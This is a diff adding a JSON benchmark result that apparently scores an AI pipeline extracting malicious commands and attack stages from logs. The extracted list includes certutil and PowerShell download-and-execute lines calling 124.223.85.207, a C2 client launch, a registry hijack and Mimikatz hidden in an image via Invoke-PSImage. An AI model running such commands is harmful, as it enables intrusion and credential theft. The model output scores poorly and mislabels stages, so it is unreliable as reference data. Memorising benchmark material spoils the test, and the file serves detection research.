@@ -1,0 +1,108 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/a C:\\Windows\\Temp\\a.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\u2604\uc988\ub7ad\uc740\ud558.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "reg.exe add \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd  /c start /min sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1546.008 -TestNumbers 1 -Cleanup",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).DownloadString('http://124.223.85.207:8082/a'))\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil -urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe'",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1548.002 -TestNumbers 2",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "An attacker initially accessed the system using `certutil` to download malware, then executed various scripts using PowerShell to elevate privileges, communicate with the compromised system, persist through registry modifications, and collect sensitive information while also attempting to evade detection.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 41265,
+      "completion_tokens": 5970,
+      "total_tokens": 47235,
+      "wall_clock_s": 232.311,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.2857142857142857,
+      "recall": 0.26666666666666666,
+      "f1": 0.2758620689655172,
+      "tp": 4,
+      "fp": 10,
+      "fn": 11
+    },
+    "stage": {
+      "precision": 0.07142857142857142,
+      "recall": 0.07142857142857142,
+      "f1": 0.07142857142857142,
+      "tp": 1,
+      "fp": 13,
+      "fn": 13,
+      "recall_partial": 0.14285714285714285
+    },
+    "hallucination_rate": 0.07692307692307693,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 41265,
+      "completion_tokens": 5970,
+      "total_tokens": 47235,
+      "wall_clock_s": 232.311,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
